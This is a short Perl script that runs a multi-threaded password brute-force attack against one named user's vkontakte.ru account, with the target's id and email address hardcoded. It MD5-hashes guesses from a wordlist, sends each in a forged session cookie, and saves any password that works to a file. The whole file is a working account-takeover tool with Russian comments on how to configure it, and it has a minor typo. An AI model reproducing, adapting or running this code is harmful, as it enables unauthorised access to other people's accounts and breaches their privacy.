#!/usr/bin/perl

use IO::Socket;
use MD5;
use threads;
use threads::shared;
my @pass : shared;

######################################
# C!klodoL
# vkontakte.ru bruteforce with multi-threads
######################################
$dic =  'passl.txt';                            #словарь паролей
$id = 26179667;                                 #id цели
$mail = 'Sanrybakov%40yandex.ru';                           #мыло, вместо @ вписать %40
$threads = 4;                              #количество потоков 
######################################

open (pass, "<$dic");

Next:
@pass = pass();

for(0..$threads) {$trl[$_] = threads->create(&Brut, $_);}
for(@trl) { $_->join; }

sub Brut
{

while (@pass){

$pass = shift @pass;

$md5 = MD5->hexhash($pass);
$sock = IO::Socket::INET->new(Proto=>'tcp',PeerAddr=>'vkontakte.ru',PeerPor t=>80);
print $sock "HEAD http://vkontakte.ru/ HTTP/1.0\r\n".
"Host: vkontakte.ru\r\n".
"Accept: */*\r\n".
"Content-Type: application/x-www-form-urlencoded\r\n".
"User-Agent: Mozillo\r\n".
"Cookie: remixchk=2; remixmid=$id; remixemail=$mail; remixpass=$md5\r\n".
"Connection: close\r\n\r\n";
$answ = <$sock>;
close $sock;
print "$pass $answ";
if ($answ =~ /302/){
open (good, '>>good.txt');
print good "$id:$pass:$md5\n";
print "$id:$pass:$md5\n";
close good;
exit;}
}

}

goto Next;

sub pass
{
my (@mas);
while (<pass>){
push @mas, $_;
last if (@mas == 400);
}
chomp @mas;
return @mas;
}

